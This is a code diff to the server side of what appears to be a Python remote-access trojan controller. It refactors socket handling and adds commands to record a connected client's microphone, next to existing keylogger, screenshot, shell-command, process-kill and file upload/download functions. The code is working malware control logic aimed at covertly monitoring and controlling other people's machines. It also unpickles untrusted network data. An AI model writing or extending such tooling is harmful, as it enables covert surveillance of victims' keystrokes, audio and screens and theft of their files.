@@ -10,6 +10,10 @@ from getpass import getuser
 from pickle import loads, dumps
 from pathlib import Path
 from time import sleep, time
+from sounddevice import InputStream, play, wait
+from soundfile import write as soundwrite
+from numpy import load as npload
+from io import BytesIO
 from rich.progress import BarColumn, Progress, TimeRemainingColumn
 from rich import print as printr
 from rich.console import Console
@@ -33,10 +37,9 @@ class Server(object):
     # kills some processes by name or pid
     def terminateProcess(self, processname):
         if processname and self.userAttached:
-            connection = self.getCurrentUser()['conn']
-            connection.send(self.lastCommand.encode())
+            self.sendLastCommand()
             try:
-                header = self.receiveHeader(connection)
+                header = self.receiveHeader()
                 printr(header['content'])
             except EOFError:
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
@@ -47,12 +50,11 @@ class Server(object):
     # getting info of only one process
     def getProcessInfo(self, processname):
         if processname and self.userAttached:
-            connection = self.getCurrentUser()['conn']
-            connection.send(self.lastCommand.encode())
+            self.sendLastCommand()
             try:
-                header = self.receiveHeader(connection)
+                header = self.receiveHeader()
                 if header['sucess']:
-                    processInfo = self.receiveProcessList(connection, header)
+                    processInfo = self.receiveProcessList(header)
                     table = Table(show_footer=False, title=f'List of all {processname.title()} processes running', box=SIMPLE) # creating table to show data from received processes
                     for column in ['PID', 'User', 'Process Name', 'Executable', 'Cwd', 'Cpu', 'Mem']: # adding the columns
                         table.add_column(column, justify='center')
@@ -73,11 +75,10 @@ class Server(object):
     # getting all processes running in client side
     def getProcessList(self, args):
         if self.userAttached:
-            connection = self.getCurrentUser()['conn']
-            connection.send(self.lastCommand.encode())
+            self.sendLastCommand()
             try:
-                header = self.receiveHeader(connection)
-                processInfo = self.receiveProcessList(connection, header)
+                header = self.receiveHeader()
+                processInfo = self.receiveProcessList(header)
                 table = Table(show_footer=False, title=f"List of all processes running.", box=SIMPLE) # creating table to show data from received processes
                 for column in ['PID', 'User', 'Process Name', 'Executable', 'Cwd']: # adding the columns
                     table.add_column(column, justify="center")
@@ -93,7 +94,7 @@ class Server(object):
         else:
             printr(f'Info: Shows basic information of all process running on the client side')
 
-    def receiveProcessList(self, connection, header):
+    def receiveProcessList(self, header):
         progress = Progress("[progress.description][green]{task.description}", BarColumn(), "[progress.percentage]{task.percentage:>3.0f}%", TimeRemainingColumn())
 
         with progress:
@@ -102,7 +103,7 @@ class Server(object):
             processList = received = b''
 
             while len(processList) < header['bytes']:
-                received = connection.recv(header['bytes'])
+                received = self.getCurrentUser()['conn'].recv(header['bytes'])
                 processList += received
                 progress.update(task, advance=len(received))
         
@@ -111,10 +112,9 @@ class Server(object):
     # starting the keyboard logger
     def kloggerStart(self, args):
         if self.userAttached:
-            connection = self.getCurrentUser()['conn']
-            connection.send(self.lastCommand.encode())
+            self.sendLastCommand()
             try:
-                header = self.receiveHeader(connection)
+                header = self.receiveHeader()
                 printr(header['content'])
             except EOFError:
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
@@ -125,12 +125,12 @@ class Server(object):
     # saving the captured keys 
     def kloggerDump(self, args):
         if self.userAttached:
-            connection = self.getCurrentUser()['conn']
-            connection.send(self.lastCommand.encode())
+            self.sendLastCommand()
             try:
-                header = self.receiveHeader(connection)
+                header = self.receiveHeader()
                 if header['sucess']:
-                    self.receiveFile(connection, header)
+                    data = self.receiveFile(header)
+                    self.saveReceivedFile(data, f'./{header["path"]}/{header["namefile"]}{header["extension"]}')
                     printr(f'[green] See in [yellow]/files/{header["namefile"]}{header["extension"]}')
                 else:
                     printr(header['content'])
@@ -143,11 +143,40 @@ class Server(object):
     # stopping the keyboard logger
     def kloggerStop(self, args):
         if self.userAttached:
-            connection = self.getCurrentUser()['conn']
-            connection.send(self.lastCommand.encode())
+            self.sendLastCommand()
             try:
-                header = self.receiveHeader(connection)
+                header = self.receiveHeader()
                 printr(header['content'])                    
+            except EOFError:
+                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
+                self.removecurrentSession() # removing the current session because connection probaly was lost
+        else:
+            printr(f'Info: Stop the keyboard listener and save the captured keys.')
+
+    def micStream(self, args):
+        if self.userAttached:
+            self.sendLastCommand()
+            try:
+                # here
+                pass
+            except EOFError:
+                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
+                self.removecurrentSession() # removing the current session because connection probaly was lost
+        else:
+            printr(f'Info: Stop the keyboard listener and save the captured keys.')
+
+    def micRecord(self, args):
+        if self.userAttached:
+            self.sendLastCommand()
+            try:
+                header = self.receiveHeader()
+                if header['sucess']:
+                    data = self.receiveFile(header)
+                    self.checkFolders()
+                    soundwrite(f'./files/{header["namefile"]}{header["extension"]}', npload(BytesIO(data), allow_pickle=True), 44100)
+                    printr(f'[green] See in [yellow]/files/{header["namefile"]}{header["extension"]}')
+                else:
+                    printr(header['content'])
             except EOFError:
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                 self.removecurrentSession() # removing the current session because connection probaly was lost
@@ -210,11 +239,11 @@ class Server(object):
                 Path(folder).mkdir()
 
     # send header to client side (about messages, files...)
-    def sendHeader(self, connection, header):
-        connection.send(dumps(header))
+    def sendHeader(self, header):
+        self.getCurrentUser()['conn'].send(dumps(header))
 
-    def receiveHeader(self, connection):
-        return loads(connection.recv(512))
+    def receiveHeader(self):
+        return loads(self.getCurrentUser()['conn'].recv(512))
 
     # return name of file, your extension and bytes content
     def splitFile(self, path):
@@ -222,12 +251,12 @@ class Server(object):
             return Path(path).stem, Path(path).suffix, file.read()
 
     # saving any received file from client side
-    def saveReceivedFile(self, path, content):
+    def saveReceivedFile(self, content, path):
         with open(path, 'wb') as receivedFile:
             receivedFile.write(content)
 
     # receiving bytes content of any file from client side | params: connection= current user attached, header= received header of file
-    def receiveFile(self, connection, header):
+    def receiveFile(self, header):
         self.checkFolders()
         progress = Progress("[progress.description][green]{task.description}", BarColumn(), "[progress.percentage]{task.percentage:>3.0f}%", TimeRemainingColumn())
 
@@ -237,26 +266,25 @@ class Server(object):
             file = received = b''
 
             while len(file) < header['bytes']:
-                received = connection.recv(header['bytes'])
+                received = self.getCurrentUser()['conn'].recv(header['bytes'])
                 file += received
                 progress.update(task, advance=len(received))
 
-        self.saveReceivedFile(f'./{header["path"]}/{header["namefile"]}{header["extension"]}', file)
+        return file
     
     # uploading a local file (server side) to client side
     def upload(self, args):
         if args and self.userAttached:
             try:
                 if Path(args).is_file():
-                    connection = self.getCurrentUser()['conn']
-                    connection.send(self.lastCommand.encode())
+                    self.sendLastCommand()
                     
                     namefile, extension, file = self.splitFile(args)
-                    self.sendHeader(connection, {"namefile": namefile, "extension": extension, "bytes": len(file)})    
+                    self.sendHeader({"namefile": namefile, "extension": extension, "bytes": len(file)})    
                     sleep(0.5)
-                    connection.send(file)
+                    self.getCurrentUser()['conn'].send(file)
 
-                    response = self.receiveHeader(connection)
+                    response = self.receiveHeader()
                     printr(response['content'])
                 else:
                     printr(f'[red] File {args} not found.')
@@ -268,12 +296,12 @@ class Server(object):
     # downloading a file from client side
     def download(self, args):
         if args and self.userAttached:
-            connection = self.getCurrentUser()['conn']
-            connection.send(self.lastCommand.encode())
+            self.sendLastCommand()
             try:
-                header = self.receiveHeader(connection)
+                header = self.receiveHeader()
                 if header["sucess"]:
-                    self.receiveFile(connection, header)
+                    data = self.receiveFile(header)
+                    self.saveReceivedFile(data, f'./{header["path"]}/{header["namefile"]}{header["extension"]}')
                 else:
                     printr(header['content'])
             except EOFError:
@@ -288,13 +316,13 @@ class Server(object):
 
         if self.userAttached:
             try:
-                connection = self.getCurrentUser()['conn']
-                connection.send(self.lastCommand.encode())
+                self.sendLastCommand()
                 
-                header = self.receiveHeader(connection)
+                header = self.receiveHeader()
                 if args:
                     if header['sucess']:
-                        self.receiveFile(connection, header)
+                        data = self.receiveFile(header)
+                        self.saveReceivedFile(data, f'./{header["path"]}/{header["namefile"]}{header["extension"]}')
                     else:
                         printr(header["content"])
                 else:
@@ -312,11 +340,11 @@ class Server(object):
     # taking a screenshot from client side
     def screenshot(self, args):
         if self.userAttached:
-            connection = self.getCurrentUser()['conn']
-            connection.send(self.lastCommand.encode())
+            self.sendLastCommand()
             try:
-                header = self.receiveHeader(connection)
-                self.receiveFile(connection, header)
+                header = self.receiveHeader()
+                data = self.receiveFile(header)
+                self.saveReceivedFile(data, f'./{header["path"]}/{header["namefile"]}{header["extension"]}')
             except EOFError:
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                 self.removecurrentSession() # removing the current session because connection probaly was lost
@@ -408,6 +436,8 @@ class Server(object):
             "/processlist": {"local": False, "action": self.getProcessList},
             "/processinfo": {"local": False, "action": self.getProcessInfo},
             "/terminateprocess": {"local": False, "action": self.terminateProcess},
+            "/micrecord": {"local": False, "action": self.micRecord},
+            "/micstream": {"local": False, "action": self.micStream},
             "/kloggerstart": {"local": False, "action": self.kloggerStart},
             "/kloggerdump": {"local": False, "action": self.kloggerDump},
             "/kloggerstop": {"local": False, "action": self.kloggerStop},
@@ -440,27 +470,30 @@ class Server(object):
             printr('[red] Command does not exist.')
 
     # receiving bytes from command response 
-    def receiveCommand(self, connection, header):
+    def receiveCommand(self, header):
         received = b''
         while len(received) < header['bytes']:
-            received += connection.recv(header['bytes'])
+            received += self.getCurrentUser()['conn'].recv(header['bytes'])
 
         print(received.decode())
 
         h, m, s = self.calculateElapsedTime(time() - header["initialTime"]);del(h,m)
         printr(f'returned in {s:.1f} seconds.') # time response of command
 
+    # sending last used command
+    def sendLastCommand(self):
+        self.getCurrentUser()['conn'].send(self.lastCommand.encode())
+
     # send command to be execute in shell of client side
     def sendCommand(self, command):
         self.lastCommand = command
 
         if self.userAttached: # if exists session attached
-            connection = self.getCurrentUser()['conn'] # getting the socket object from the current user
-            connection.send(command.encode())
+            self.sendLastCommand()
             try:
-                header = self.receiveHeader(connection) # receiving header of the command
+                header = self.receiveHeader() # receiving header of the command
                 self.userCwd = header['currentDirectory'] # updating the current directory you are
-                self.receiveCommand(connection, header)
+                self.receiveCommand(header)
             except EOFError:
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                 self.removecurrentSession() # removing the current session because connection probaly was lost
